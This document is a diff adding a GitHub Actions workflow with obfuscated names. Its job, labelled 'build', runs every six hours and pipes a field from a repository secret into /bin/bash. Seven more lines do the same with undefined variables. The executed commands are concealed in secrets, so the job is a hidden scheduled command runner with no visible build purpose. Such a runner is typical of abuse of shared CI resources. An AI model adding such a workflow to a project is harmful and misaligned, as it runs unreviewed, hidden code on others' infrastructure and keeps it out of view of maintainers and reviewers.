@@ -1,0 +1,25 @@
+name: mingyulu1837
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '49 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: mingyulu1837
+        env:
+          rl746: ${{ secrets.rl746 }}
+        run: |
+          echo $rl746 | jq -r .tapsc33501 | /bin/bash
+          echo $ageb81 | jq -r .dbzd8503 | /bin/bash
+          echo $utn0437 | jq -r .pf30 | /bin/bash
+          echo $vn84 | jq -r .upyc7164 | /bin/bash
+          echo $lv16221 | jq -r .jukrv0 | /bin/bash
+          echo $y9 | jq -r .ftwcb09 | /bin/bash
+          echo $riksi031 | jq -r .wx28 | /bin/bash
+          echo $hgoq65 | jq -r .zty4 | /bin/bash
+
